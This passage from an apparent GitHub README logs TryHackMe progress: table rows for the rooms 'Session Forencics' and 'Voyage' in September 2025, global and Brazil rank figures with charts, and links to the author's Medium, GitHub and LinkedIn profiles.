| 2025, Sep 2       |Medium 🔗 - Session Forencics | 484     |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ   |    14ᵗʰ    | 123,786  |    938   |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage | 483     |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ   |    15ᵗʰ    | 123,636  |    937   |    73     |

</div>

<p align="center">Global All Time:   114ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/8ca5c4b9-04d1-4237-a64d-157a55304477"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/d75c2844-bb94-4d43-b689-f8702b5b50a1"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/e1a5a0e1-9413-4001-89e1-c816b23fb8d6"><br>
                  Global monthly:    844ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/2a50d58d-da67-428a-a2d8-311bfbc58b19"><br>
                  Brazil monthly:     12ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/90cc0c4b-ec77-4431-b244-b27f87cca18d"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>




